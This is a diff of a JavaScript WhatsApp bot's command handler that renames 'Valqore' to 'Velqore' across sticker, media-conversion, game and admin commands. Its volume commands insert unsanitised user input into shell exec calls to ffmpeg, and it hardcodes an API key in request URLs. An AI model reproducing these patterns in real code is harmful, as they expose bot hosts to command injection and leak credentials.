                     text: pinga,
                     contextInfo: {
                         externalAdReply: {
@@ -2981,7 +2977,7 @@ break
 case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
 let me = m.sender
 let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
-sendValqoreIncMessage(from, { 
+sendVelqoreIncMessage(from, { 
 text: teks,
 mentions:[sender],
 contextInfo:{
@@ -2994,7 +2990,7 @@ mentionedJid:[sender],
 "title": botname, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": fs.readFileSync("./ValqoreMedia/theme/cheemspic.jpg"),
+"thumbnail": fs.readFileSync("./VelqoreMedia/theme/cheemspic.jpg"),
 "mediaUrl": `${wagc}`,
 "sourceUrl": `${wagc}`
 }
@@ -3003,7 +2999,7 @@ mentionedJid:[sender],
 }
 break
             case 'owner': {
-                ValqoreInc.sendMessage(from, {
+                VelqoreInc.sendMessage(from, {
                     contacts: {
                         displayName: `${list.length} Contact`,
                         contacts: list
@@ -3015,51 +3011,51 @@ break
             break
             //convert
 case 's': case 'sticker': case 'stiker': {
-if (!quoted) return replygcValqore(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+if (!quoted) return replygcVelqore(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
 if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await ValqoreInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await VelqoreInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcValqore('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
+if ((quoted.msg || quoted).seconds > 11) return replygcVelqore('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
 let media = await quoted.download()
-let encmedia = await ValqoreInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await VelqoreInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 } else {
-replygcValqore(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+replygcVelqore(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
 }
 }
 break
             case 'swm': case 'steal': case 'stickerwm': case 'take':{
 if (!isPremium) return replyprem(mess.premium)
-if (!args.join(" ")) return replygcValqore(`Where is the text?`)
+if (!args.join(" ")) return replygcVelqore(`Where is the text?`)
 const swn = args.join(" ")
 const pcknm = swn.split("|")[0]
 const atnm = swn.split("|")[1]
 if (m.quoted.isAnimated === true) {
-ValqoreInc.downloadAndSaveMediaMessage(quoted, "gifee")
-ValqoreInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+VelqoreInc.downloadAndSaveMediaMessage(quoted, "gifee")
+VelqoreInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
 } else if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await ValqoreInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+let encmedia = await VelqoreInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcValqore('Maximum 10 Seconds!')
+if ((quoted.msg || quoted).seconds > 11) return replygcVelqore('Maximum 10 Seconds!')
 let media = await quoted.download()
-let encmedia = await ValqoreInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+let encmedia = await VelqoreInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 } else {
-replygcValqore(`Photo/Video?`)
+replygcVelqore(`Photo/Video?`)
 }
 }
 break
             case 'toimage':
             case 'toimg': {
-                if (!/webp/.test(mime)) return replygcValqore(`Reply sticker with caption *${prefix + command}*`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(qmsg)
+                if (!/webp/.test(mime)) return replygcVelqore(`Reply sticker with caption *${prefix + command}*`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(qmsg)
                 let ran = await getRandom('.png')
                 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                     fs.unlinkSync(media)
                     if (err) return err
                     let buffer = fs.readFileSync(ran)
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         image: buffer
                     }, {
                         quoted: m
@@ -3071,11 +3067,11 @@ break
             break
             case 'tomp4':
             case 'tovideo': {
-                if (!/webp/.test(mime)) return replygcValqore(`Reply sticker with caption *${prefix + command}*`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(qmsg)
+                if (!/webp/.test(mime)) return replygcVelqore(`Reply sticker with caption *${prefix + command}*`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(qmsg)
                 let webpToMp4 = await webp2mp4File(media)
-                await ValqoreInc.sendMessage(m.chat, {
+                await VelqoreInc.sendMessage(m.chat, {
                     video: {
                         url: webpToMp4.result,
                         caption: 'Convert Webp To Video'
@@ -3089,11 +3085,11 @@ break
             break
             case 'toaud':
             case 'toaudio': {
-                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcValqore(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadMediaMessage(qmsg)
+                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcVelqore(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadMediaMessage(qmsg)
                 let audio = await toAudio(media, 'mp4')
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     audio: audio,
                     mimetype: 'audio/mpeg'
                 }, {
@@ -3103,14 +3099,14 @@ break
             }
             break
             case 'tomp3': {
-                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcValqore(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadMediaMessage(qmsg)
+                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcVelqore(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadMediaMessage(qmsg)
                 let audio = await toAudio(media, 'mp4')
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     document: audio,
                     mimetype: 'audio/mp3',
-                    fileName: `Valqore.mp3`
+                    fileName: `Velqore.mp3`
                 }, {
                     quoted: m
                 })
@@ -3119,14 +3115,14 @@ break
             break
             case 'tovn':
             case 'toptt': {
-                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcValqore(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadMediaMessage(qmsg)
+                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcVelqore(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadMediaMessage(qmsg)
                 let {
                     toPTT
                 } = require('./lib/converter')
                 let audio = await toPTT(media, 'mp4')
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     audio: audio,
                     mimetype: 'audio/mpeg',
                     ptt: true
@@ -3137,11 +3133,11 @@ break
             }
             break
             case 'togif': {
-                if (!/webp/.test(mime)) return replygcValqore(`Reply sticker with caption *${prefix + command}*`)
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(qmsg)
+                if (!/webp/.test(mime)) return replygcVelqore(`Reply sticker with caption *${prefix + command}*`)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(qmsg)
                 let webpToMp4 = await webp2mp4File(media)
-                await ValqoreInc.sendMessage(m.chat, {
+                await VelqoreInc.sendMessage(m.chat, {
                     video: {
                         url: webpToMp4.result,
                         caption: 'Convert Webp To Video'
@@ -3155,14 +3151,14 @@ break
             }
             break
             case 'tourl': {
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(qmsg)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(qmsg)
                 if (/image/.test(mime)) {
                     let anu = await TelegraPh(media)
-                    replygcValqore(util.format(anu))
+                    replygcVelqore(util.format(anu))
                 } else if (!/image/.test(mime)) {
                     let anu = await UploadFileUgu(media)
-                    replygcValqore(util.format(anu))
+                    replygcVelqore(util.format(anu))
                 }
                 await fs.unlinkSync(media)
 
@@ -3170,12 +3166,12 @@ break
             break
             case 'emojimix': {
                 let [emoji1, emoji2] = text.split`+`
-                if (!emoji1) return replygcValqore(`Example : ${prefix + command} 😅+🤔`)
-                if (!emoji2) return replygcValqore(`Example : ${prefix + command} 😅+🤔`)
-                await ValqoreStickWait()
+                if (!emoji1) return replygcVelqore(`Example : ${prefix + command} 😅+🤔`)
+                if (!emoji2) return replygcVelqore(`Example : ${prefix + command} 😅+🤔`)
+                await VelqoreStickWait()
                 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                 for (let res of anu.results) {
-                    let encmedia = await ValqoreInc.sendImageAsSticker(m.chat, res.url, m, {
+                    let encmedia = await VelqoreInc.sendImageAsSticker(m.chat, res.url, m, {
                         packname: global.packname,
                         author: global.author,
                         categories: res.tags
@@ -3184,10 +3180,10 @@ break
             }
             break
             case 'emojimix2': {
-                if (!text) return replygcValqore(`Example : ${prefix + command} 😅`)
+                if (!text) return replygcVelqore(`Example : ${prefix + command} 😅`)
                 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                 for (let res of anu.results) {
-                    let encmedia = await ValqoreInc.sendImageAsSticker(m.chat, res.url, m, {
+                    let encmedia = await VelqoreInc.sendImageAsSticker(m.chat, res.url, m, {
                         packname: global.packname,
                         author: global.author,
                         categories: res.tags
@@ -3197,10 +3193,10 @@ break
             break
             case 'toonce':
             case 'toviewonce': {
-                if (!quoted) return replygcValqore(`Reply Image/Video`)
+                if (!quoted) return replygcVelqore(`Reply Image/Video`)
                 if (/image/.test(mime)) {
-                    anuan = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                    ValqoreInc.sendMessage(m.chat, {
+                    anuan = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                    VelqoreInc.sendMessage(m.chat, {
                         image: {
                             url: anuan
                         },
@@ -3211,8 +3207,8 @@ break
                         quoted: m
                     })
                 } else if (/video/.test(mime)) {
-                    anuanuan = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                    ValqoreInc.sendMessage(m.chat, {
+                    anuanuan = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                    VelqoreInc.sendMessage(m.chat, {
                         video: {
                             url: anuanuan
                         },
@@ -3223,8 +3219,8 @@ break
                         quoted: m
                     })
                 } else if (/audio/.test(mime)) {
-                   bebasap = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                   ValqoreInc.sendMessage(m.chat, {
+                   bebasap = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                   VelqoreInc.sendMessage(m.chat, {
                      audio: {
                         url: bebasap
                      },
@@ -3236,14 +3232,14 @@ break
             }
             break
             case 'fliptext': {
-                if (args.length < 1) return replygcValqore(`Example:\n${prefix}fliptext Valqore`)
+                if (args.length < 1) return replygcVelqore(`Example:\n${prefix}fliptext Velqore`)
                 quere = args.join(" ")
                 flipe = quere.split('').reverse().join('')
-                replygcValqore(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
+                replygcVelqore(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
             }
             break
             case 'toqr':{
-  if (!q) return replygcValqore(' Please include link or text!')
+  if (!q) return replygcVelqore(' Please include link or text!')
    const QrCode = require('qrcode-reader')
    const qrcode = require('qrcode')
    let qyuer = await qrcode.toDataURL(q, { scale: 35 })
@@ -3251,32 +3247,32 @@ break
    let buff = getRandom('.jpg')
    await fs.writeFileSync('./'+buff, data)
    let medi = fs.readFileSync('./' + buff)
-  await ValqoreInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
+  await VelqoreInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
    setTimeout(() => { fs.unlinkSync(buff) }, 10000)
   }
   break
   case 'volaudio': {
-if (!args.join(" ")) return replygcValqore(`Example: ${prefix + command} 10`)
-media = await ValqoreInc.downloadAndSaveMediaMessage(quoted, "volume")
+if (!args.join(" ")) return replygcVelqore(`Example: ${prefix + command} 10`)
+media = await VelqoreInc.downloadAndSaveMediaMessage(quoted, "volume")
 rname = getRandom('.mp3')
 exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
-if (err) return replygcValqore('Error!')
+if (err) return replygcVelqore('Error!')
 jadie = fs.readFileSync(rname)
-ValqoreInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
+VelqoreInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
 fs.unlinkSync(rname)
 })
 }
 break
 case 'volvideo': {
-if (!args.join(" ")) return replygcValqore(`Example: ${prefix + command} 10`)
-media = await ValqoreInc.downloadAndSaveMediaMessage(quoted, "volume")
+if (!args.join(" ")) return replygcVelqore(`Example: ${prefix + command} 10`)
+media = await VelqoreInc.downloadAndSaveMediaMessage(quoted, "volume")
 rname = getRandom('.mp4')
 exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
-if (err) return replygcValqore('Error!')
+if (err) return replygcVelqore('Error!')
 jadie = fs.readFileSync(rname)
-ValqoreInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
+VelqoreInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
 fs.unlinkSync(rname)
 })
 }
@@ -3297,19 +3293,19 @@ break
                 if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                 if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                 if (/audio/.test(mime)) {
-                await ValqoreStickWait()
-                let media = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
+                await VelqoreStickWait()
+                let media = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
                 let ran = getRandom('.mp3')
                 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                 fs.unlinkSync(media)
-                if (err) return replygcValqore(err)
+                if (err) return replygcVelqore(err)
                 let buff = fs.readFileSync(ran)
-                ValqoreInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
+                VelqoreInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                 fs.unlinkSync(ran)
                 })
-                } else replygcValqore(`Reply to the audio you want to change with a caption *${prefix + command}*`)
+                } else replygcVelqore(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                 } catch (e) {
-                replygcValqore(e)
+                replygcVelqore(e)
                 }
                 break
                 //media db
@@ -3319,7 +3315,7 @@ for (let x of bad) {
 teks += `│⭔ ${x}\n`
 }
 teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
-replygcValqore(teks)
+replygcVelqore(teks)
 }
 break
 
@@ -3329,10 +3325,10 @@ break
             case 'tictactoe': {
                 let TicTacToe = require("./lib/tictactoe")
                 this.game = this.game ? this.game : {}
-                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcValqore('You are still in the game')
+                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcVelqore('You are still in the game')
                 let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                 if (room) {
-                    replygcValqore('Partner not found!')
+                    replygcVelqore('Partner not found!')
                     room.o = m.chat
                     room.game.playerO = m.sender
                     room.state = 'PLAYING'
@@ -3360,10 +3356,10 @@ ${arr.slice(6).join('')}
 Wait @${room.game.currentTurn.split('@')[0]}
 
 Type *surrender* to give up and admit defeat`
-                    if (room.x !== room.o) await ValqoreInc.sendText(room.x, str, m, {
+                    if (room.x !== room.o) await VelqoreInc.sendText(room.x, str, m, {
                         mentions: parseMention(str)
                     })
-                    await ValqoreInc.sendText(room.o, str, m, {
+                    await VelqoreInc.sendText(room.o, str, m, {
                         mentions: parseMention(str)
                     })
                 } else {
@@ -3375,7 +3371,7 @@ Type *surrender* to give up and admit defeat`
                         state: 'WAITING'
                     }
                     if (text) room.name = text
-                    replygcValqore('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
+                    replygcVelqore('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                     this.game[room.id] = room
                 }
             }
@@ -3386,12 +3382,12 @@ Type *surrender* to give up and admit defeat`
                 try {
                     if (this.game) {
                         delete this.game
-                        ValqoreInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
+                        VelqoreInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                     } else if (!this.game) {
-                        replygcValqore(`Session TicTacToe🎮 tidak ada`)
+                        replygcVelqore(`Session TicTacToe🎮 tidak ada`)
                     } else mewReply('?')
                 } catch (e) {
-                    replygcValqore('rusak')
+                    replygcVelqore('rusak')
                 }
             }
             break
@@ -3401,12 +3397,12 @@ Type *surrender* to give up and admit defeat`
                 let poin = 10
                 let poin_lose = 10
                 let timeout = 60000
-                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcValqore(`Finish your previous suit`)
-                if (m.mentionedJid[0] === m.sender) return replygcValqore(`Can't play with myself !`)
-                if (!m.mentionedJid[0]) return replygcValqore(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
+                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcVelqore(`Finish your previous suit`)
+                if (m.mentionedJid[0] === m.sender) return replygcVelqore(`Can't play with myself !`)
+                if (!m.mentionedJid[0]) return replygcVelqore(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                     mentions: [owner[1] + '@s.whatsapp.net']
                 })
-                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcValqore(`The person you are challenging is playing suit with someone else :(`)
+                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcVelqore(`The person you are challenging is playing suit with someone else :(`)
                 let id = 'suit_' + new Date() * 1
                 let caption = `_*SUIT PvP*_
 
@@ -3414,7 +3410,7 @@ Type *surrender* to give up and admit defeat`
 
 Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                 this.suit[id] = {
-                    chat: await ValqoreInc.sendText(m.chat, caption, m, {
+                    chat: await VelqoreInc.sendText(m.chat, caption, m, {
                         mentions: parseMention(caption)
                     }),
                     id: id,
@@ -3422,7 +3418,7 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                     p2: m.mentionedJid[0],
                     status: 'wait',
                     waktu: setTimeout(() => {
-                        if (this.suit[id]) ValqoreInc.sendText(m.chat, `_Suit time is up_`, m)
+                        if (this.suit[id]) VelqoreInc.sendText(m.chat, `_Suit time is up_`, m)
                         delete this.suit[id]
                     }, 60000),
                     poin,
@@ -3432,17 +3428,17 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
             }
             break
             case 'mathquiz': case 'math': {
-                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcValqore(`There are still unfinished sessions!`)
+                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcVelqore(`There are still unfinished sessions!`)
                 let { genMath, modes } = require('./lib/math')
-                if (!text) return replygcValqore(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
+                if (!text) return replygcVelqore(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                 let result = await genMath(text.toLowerCase())
-                ValqoreInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
+                VelqoreInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                     kuismath[m.sender.split('@')[0]] = result.jawaban
                 })
                 await sleep(result.waktu)
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Answer: " + result.jawaban)
-                    replygcValqore("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
+                    replygcVelqore("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                     delete kuismath[m.sender.split('@')[0]]
                 }
             }
@@ -3451,22 +3447,22 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                replygcValqore(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
+                replygcVelqore(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
             }
             break	
             case 'ai': 
             case 'ask':
             case 'openai': {
-               if (db.data.users[sender].limit < 1) return replygcValqore(mess.limit)
-	            if (!q) return replygcValqore(`Example : ${prefix + command} who is ronaldo`)
+               if (db.data.users[sender].limit < 1) return replygcVelqore(mess.limit)
+	            if (!q) return replygcVelqore(`Example : ${prefix + command} who is ronaldo`)
 			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
 			      var isi = isiai.result
-		         await replygcValqore(isi)
+		         await replygcVelqore(isi)
 			   }
 			   break
     case 'xxqc': {
-if (!q) return replygcValqore(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
-if (text.length > 100) return replygcValqore(`Max 100 character.`)
+if (!q) return replygcVelqore(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
+if (text.length > 100) return replygcVelqore(`Max 100 character.`)
 let [color, ...message] = text.split(' ');
 message = message.join(' ');
 let backgroundColor;
@@ -3612,7 +3608,7 @@ case 'silver':
 backgroundColor = '#C0C0C0'; 
 break;
 default:
-return replygcValqore('The selected color is not available.')
+return replygcVelqore('The selected color is not available.')
 }
 let obj = {
 type: 'quote',
@@ -3629,7 +3625,7 @@ from: {
 id: 1,
 name: pushname,
 photo: { 
-url: await ValqoreInc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
+url: await VelqoreInc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
 }
 },
 text: message,
@@ -3643,20 +3639,20 @@ headers: {
 },
 });
 let buffer = Buffer.from(response.data.result.image, 'base64');
-ValqoreInc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
+VelqoreInc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
 }
 break
     case 'ephemeral': {
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
-                if (!isAdmins) return ValqoreStickAdmin()
-                if (!text) return replygcValqore('Enter the value enable/disable')
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
+                if (!isAdmins) return VelqoreStickAdmin()
+                if (!text) return replygcVelqore('Enter the value enable/disable')
                 if (args[0] === 'on') {
-                    await ValqoreInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
-                    await replygcValqore(`Done`)
+                    await VelqoreInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
+                    await replygcVelqore(`Done`)
                 } else if (args[0] === 'off') {
-                    await ValqoreInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
-                    await replygcValqore(`Done`)
+                    await VelqoreInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
+                    await replygcVelqore(`Done`)
                 }
             }
             break
@@ -3670,139 +3666,139 @@ break
  } catch (e) {
  	console.error(e)
  }
- ValqoreInc.sendMessage(m.chat, { delete: key })
+ VelqoreInc.sendMessage(m.chat, { delete: key })
 }
 break
     case 'autoswview':
     case 'autostatusview':{
-             if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (args.length < 1) return replygcValqore('on/off?')
+             if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   antiswview = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   antiswview = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
     case 'anticall': {
-             if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (args.length < 1) return replygcValqore('on/off?')
+             if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   anticall = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   anticall = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
              break
 case 'addvideo':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Whats the video name?')
-if (VideoValqore.includes(q)) return replygcValqore("The name is already in use")
-let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-VideoValqore.push(q)
-await fsx.copy(delb, `./ValqoreMedia/video/${q}.mp4`)
-fs.writeFileSync('./ValqoreMedia/database/Valqorevideo.json', JSON.stringify(VideoValqore))
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (args.length < 1) return replygcVelqore('Whats the video name?')
+if (VideoVelqore.includes(q)) return replygcVelqore("The name is already in use")
+let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+VideoVelqore.push(q)
+await fsx.copy(delb, `./VelqoreMedia/video/${q}.mp4`)
+fs.writeFileSync('./VelqoreMedia/database/Velqorevideo.json', JSON.stringify(VideoVelqore))
 fs.unlinkSync(delb)
-replygcValqore(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
+replygcVelqore(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
 }
 break
 case 'delvideo':{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (args.length < 1) return replygcValqore('Enter the video name')
-if (!VideoValqore.includes(q)) return replygcValqore("The name does not exist in the database")
-let wanu = VideoValqore.indexOf(q)
-VideoValqore.splice(wanu, 1)
-fs.writeFileSync('./ValqoreMedia/database/Valqorevideo.json', JSON.stringify(VideoValqore))
-fs.unlinkSync(`./ValqoreMedia/video/${q}.mp4`)
